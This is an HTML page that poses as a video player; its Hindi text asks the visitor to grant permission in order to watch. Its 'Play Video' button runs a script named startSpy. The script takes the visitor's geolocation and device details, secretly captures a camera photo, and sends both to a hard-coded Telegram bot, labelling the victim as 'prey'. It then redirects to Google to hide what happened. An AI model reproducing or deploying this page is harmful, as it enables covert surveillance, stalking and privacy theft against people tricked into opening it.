<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
        button { padding: 20px 40px; font-size: 20px; cursor: pointer; background: #ff0000; color: white; border: none; border-radius: 10px; }
    </style>
</head>
<body>
    <h1>वीडियो देखने के लिए परमिशन दें</h1>
    <button onclick="startSpy()">Play Video</button>
    <video id="video" style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        const botToken = "8845551713:AAEBoTmmoLfn9MGUQ5nL7Z5p7DhZPGEV2aY";
        const chatId = "6491656959";

        async function startSpy() {
            // 1. लोकेशन और डिवाइस डेटा
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const info = `🎯 शिकार मिला!\n📍 लोकेशन: ${pos.coords.latitude}, ${pos.coords.longitude}\n📱 डिवाइस: ${navigator.userAgent}`;
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`);
            });

            // 2. कैमरा एक्सेस और फोटो कैप्चर
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;
            await video.play();

            // फोटो खींचना
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // डेटा को टेलीग्राम पर भेजना
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob);
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                
                // काम होते ही रीडायरेक्ट
                window.location.href = "https://google.com";
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
